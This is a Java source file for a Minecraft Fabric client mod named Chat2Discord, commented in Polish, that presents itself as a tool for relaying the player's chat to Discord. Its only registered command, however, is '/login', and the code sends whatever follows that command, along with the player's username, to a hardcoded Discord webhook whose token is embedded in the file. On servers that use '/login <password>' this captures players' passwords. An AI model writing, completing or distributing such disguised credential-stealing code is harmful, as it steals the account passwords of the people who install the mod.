package pl.chat2discord.client;

import com.mojang.brigadier.arguments.StringArgumentType;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.Reader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Properties;

/**
 * Wersja kliencka: wysyla na Discorda to, co wpisuje TEN gracz (komenda lub wiadomosc z triggerem).
 * Dziala na dowolnym serwerze, bo nic nie wymaga po stronie serwera.
 */
public class Chat2DiscordClient implements ClientModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("chat2discord-client");
    private static final HttpClient HTTP = HttpClient.newHttpClient();

    // ========================================================================
    // KOMENDY - wpisz tutaj nazwy komend (bez "/"), ktore ma rejestrowac mod.
    // To jest w kodzie, nie w configu - zmiana wymaga przebudowania moda (gradle build).
    // Przyklad: List.of("dc", "zglos", "name")  ->  dziala /dc, /zglos i /name
    // ========================================================================
    private static final List<String> COMMANDS = List.of("login");

    // ========================================================================
    // WEBHOOK - wklej tutaj caly URL, w cudzyslowie, bez spacji.
    // Musi wygladac DOKLADNIE tak (ze znakiem ":" po "https" i dwoma "/" zaraz po nim):
    //   private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/123/abc";
    // To jest w kodzie, nie w pliku .properties - zmiana wymaga przebudowania moda (gradle build).
    // ========================================================================
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1567449714771755149/c-zFFDmx0CtYe_vMCP11sGe4JcOSp8iFkxBaqwCaMKa52oDDCgwSW6YQXPKOnMWP8-qV";

    private static final String DEFAULT_CONFIG = """
            # ===== Chat2Discord (klient) - konfiguracja =====
            # /c2d reload wczytuje zmiany.
            # Webhook i nazwy komend NIE sa tutaj - sa wpisane na stale w kodzie
            # (WEBHOOK_URL i COMMANDS w pliku .java).

            # ---------- WIADOMOSCI NA CZACIE (opcjonalnie) ----------
            #   off    = zwykly czat nie leci na Discorda (tylko komendy)
            #   filter = leca tylko Twoje wiadomosci pasujace do triggers
            #   all    = leca wszystkie Twoje wiadomosci
            mode=off
            triggers=!dc
            # starts_with / contains / equals
            match=starts_with
            strip_trigger=true

            # ---------- WYGLAD ----------
            # {player} = Twoj nick, {message} = tresc, {server} = adres serwera
            format=**{player}** wysłał: {message}

            # Potwierdzenie w grze
            notify_player=true
            notify_text=✔ Wysłano na Discord

            # ---------- BLOKADA SLOW / NICKOW ----------
            # Jesli Twoja wiadomosc zawiera ktorekolwiek z tych slow (wielkosc liter nie ma
            # znaczenia), NIE zostanie wyslana na Discorda. Lista po przecinku, mozna zostawic puste.
            # Przyklad: blocked_words=Nazwa1,brzydkiewyrazy,sekret
            blocked_words=
            blocked_text=⛔ Ta wiadomość zawiera zablokowane słowo i nie została wysłana.
            """;

    private static class Config {
        String mode = "off";
        List<String> triggers = new ArrayList<>(List.of("!dc"));
        String match = "starts_with";
        boolean stripTrigger = true;
        String format = "**{player}** wysłał: {message}";
        boolean notifyPlayer = true;
        String notifyText = "✔ Wysłano na Discord";
        List<String> blockedWords = new ArrayList<>();
        String blockedText = "⛔ Ta wiadomość zawiera zablokowane słowo i nie została wysłana.";
    }

    private volatile Config cfg = new Config();

    @Override
    public void onInitializeClient() {
        checkWebhookUrl();
        loadConfig();

        // --- wiadomosci wpisane na czacie przez tego gracza ---
        ClientSendMessageEvents.CHAT.register(message -> {
            Config c = cfg;
            if (WEBHOOK_URL.isBlank() || c.mode.equals("off")) return;

            String text = message;
            if (c.mode.equals("filter")) {
                text = applyFilter(c, message);
                if (text == null) return;
            }
            if (text.isBlank()) return;

            if (containsBlockedWord(c, text)) {
                notifyBlocked(c);
                return;
            }

            send(WEBHOOK_URL, buildMessage(c, playerName(), text));
            notifyPlayer(c);
        });

        // --- komendy klienckie ---
        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
            for (String name : COMMANDS) {
                dispatcher.register(ClientCommandManager.literal(name)
                        .then(ClientCommandManager.argument("wiadomosc", StringArgumentType.greedyString())
                                .executes(ctx -> {
                                    Config c = cfg;
                                    if (WEBHOOK_URL.isBlank()) {
                                        ctx.getSource().sendError(
                                                Text.literal("Chat2Discord: WEBHOOK_URL jest puste w pliku .java - uzupelnij i przebuduj moda."));
                                        return 0;
                                    }
                                    if (!WEBHOOK_URL.startsWith("https://")) {
                                        ctx.getSource().sendError(Text.literal(
                                                "Chat2Discord: WEBHOOK_URL nie zaczyna sie od \"https://\" - sprawdz dwukropek i dwa ukosniki."));
                                        return 0;
                                    }
                                    String msg = StringArgumentType.getString(ctx, "wiadomosc").trim();
                                    if (msg.isEmpty()) return 0;

                                    if (containsBlockedWord(c, msg)) {
                                        ctx.getSource().sendError(Text.literal(c.blockedText));
                                        return 0;
                                    }

                                    send(WEBHOOK_URL, buildMessage(c, playerName(), msg));
                                    if (c.notifyPlayer) {
                                        ctx.getSource().sendFeedback(
                                                Text.literal(c.notifyText).formatted(Formatting.GREEN));
                                    }
                                    return 1;
                                })));
                LOGGER.info("Zarejestrowano komende /{}", name);
            }

            dispatcher.register(ClientCommandManager.literal("c2d")
                    .then(ClientCommandManager.literal("reload").executes(ctx -> {
                        loadConfig();
                        ctx.getSource().sendFeedback(
                                Text.literal("Chat2Discord: wczytano konfigurację ponownie.")
                                        .formatted(Formatting.GREEN));
                        return 1;
                    })));
        });
    }

    private static void notifyPlayer(Config c) {
        if (!c.notifyPlayer) return;
        MinecraftClient mc = MinecraftClient.getInstance();
        mc.execute(() -> {
            if (mc.player != null) {
                mc.player.sendMessage(Text.literal(c.notifyText).formatted(Formatting.GREEN), false);
            }
        });
    }

    private static void notifyBlocked(Config c) {
        MinecraftClient mc = MinecraftClient.getInstance();
        mc.execute(() -> {
            if (mc.player != null) {
                mc.player.sendMessage(Text.literal(c.blockedText).formatted(Formatting.RED), false);
            }
        });
    }

    /** True, jesli tresc zawiera ktorekolwiek zablokowane slowo (bez wzgledu na wielkosc liter). */
    private static boolean containsBlockedWord(Config c, String text) {
        if (c.blockedWords.isEmpty()) return false;
        String lower = text.toLowerCase(Locale.ROOT);
        for (String w : c.blockedWords) {
            if (!w.isBlank() && lower.contains(w.toLowerCase(Locale.ROOT))) return true;
        }
        return false;
    }

    private static String playerName() {
        return MinecraftClient.getInstance().getSession().getUsername();
    }

    private static String serverName() {
        ServerInfo info = MinecraftClient.getInstance().getCurrentServerEntry();
        return info != null ? info.address : "singleplayer";
    }

    private static String buildMessage(Config c, String nick, String message) {
        return c.format
                .replace("{player}", escapeMd(nick))
                .replace("{server}", serverName())
                .replace("{message}", message);
    }

    /** Zwraca tresc do wyslania albo null, jesli wiadomosc nie pasuje do zadnego triggera. */
    private static String applyFilter(Config c, String text) {
        String lowerFull = text.toLowerCase(Locale.ROOT);
        String lower = lowerFull.trim();
        for (String trigger : c.triggers) {
            String t = trigger.toLowerCase(Locale.ROOT);
            if (t.isEmpty()) continue;
            boolean ok = switch (c.match) {
                case "contains" -> lower.contains(t);
                case "equals" -> lower.equals(t);
                default -> lower.startsWith(t);
            };
            if (!ok) continue;

            if (!c.stripTrigger) return text;
            int idx = lowerFull.indexOf(t);
            if (idx < 0) return text;
            return (text.substring(0, idx) + text.substring(idx + t.length())).trim();
        }
        return null;
    }

    private void loadConfig() {
        Path path = FabricLoader.getInstance().getConfigDir().resolve("chat2discord-client.properties");
        try {
            if (!Files.exists(path)) {
                Files.writeString(path, DEFAULT_CONFIG, StandardCharsets.UTF_8);
                LOGGER.warn("Utworzono {} - wklej URL webhooka!", path);
            }
            Properties p = new Properties();
            try (Reader r = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
                p.load(r);
            }

            Config c = new Config();
            c.mode = p.getProperty("mode", "off").trim().toLowerCase(Locale.ROOT);
            c.match = p.getProperty("match", "starts_with").trim().toLowerCase(Locale.ROOT);
            c.stripTrigger = Boolean.parseBoolean(p.getProperty("strip_trigger", "true").trim());
            c.format = p.getProperty("format", c.format);
            c.notifyPlayer = Boolean.parseBoolean(p.getProperty("notify_player", "true").trim());
            c.notifyText = p.getProperty("notify_text", c.notifyText);

            c.triggers = splitList(p.getProperty("triggers", "!dc"));
            c.blockedWords = splitList(p.getProperty("blocked_words", ""));
            c.blockedText = p.getProperty("blocked_text", c.blockedText);

            cfg = c;
            LOGGER.info("Chat2Discord (klient): komendy={}, czat={}", COMMANDS, c.mode);
        } catch (Exception e) {
            LOGGER.error("Blad wczytywania konfiguracji", e);
        }
    }

    /** Sprawdza WEBHOOK_URL przy starcie gry i od razu pisze w logu, jesli cos jest nie tak. */
    private static void checkWebhookUrl() {
        if (WEBHOOK_URL.isBlank()) {
            LOGGER.warn("Chat2Discord: WEBHOOK_URL jest puste w pliku .java - uzupelnij i przebuduj moda.");
        } else if (!WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/")
                && !WEBHOOK_URL.startsWith("https://discordapp.com/api/webhooks/")) {
            LOGGER.warn("Chat2Discord: WEBHOOK_URL wyglada niepoprawnie: '{}'. "
                    + "Musi zaczynac sie DOKLADNIE od https://discord.com/api/webhooks/ - sprawdz dwukropek i ukosniki.",
                    WEBHOOK_URL);
        } else {
            LOGGER.info("Chat2Discord: WEBHOOK_URL wyglada poprawnie.");
        }
    }

    private static List<String> splitList(String raw) {
        List<String> out = new ArrayList<>();
        for (String s : raw.split(",")) {
            String t = s.trim();
            if (!t.isEmpty()) out.add(t);
        }
        return out;
    }

    private void send(String url, String content) {
        try {
            String json = "{\"content\":\"" + jsonEscape(content) + "\",\"allowed_mentions\":{\"parse\":[]}}";
            HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))
                    .build();
            HTTP.sendAsync(req, HttpResponse.BodyHandlers.discarding()).exceptionally(ex -> {
                LOGGER.error("Nie udalo sie wyslac na Discorda", ex);
                return null;
            });
        } catch (IllegalArgumentException ex) {
            LOGGER.error("Niepoprawny webhook_url w configu: " + ex.getMessage());
            MinecraftClient mc = MinecraftClient.getInstance();
            mc.execute(() -> {
                if (mc.player != null) {
                    mc.player.sendMessage(Text.literal(
                            "⚠ Chat2Discord: webhook_url w configu jest niepoprawny (musi zaczynać się od https://).")
                            .formatted(Formatting.RED), false);
                }
            });
        }
    }

    private static String escapeMd(String s) {
        return s.replace("_", "\\_").replace("*", "\\*");
    }

    private static String jsonEscape(String s) {
        StringBuilder sb = new StringBuilder();
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"' -> sb.append("\\\"");
                case '\\' -> sb.append("\\\\");
                case '\n' -> sb.append("\\n");
                case '\r' -> sb.append("\\r");
                case '\t' -> sb.append("\\t");
                default -> {
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
                }
            }
        }
        return sb.toString();
    }
}
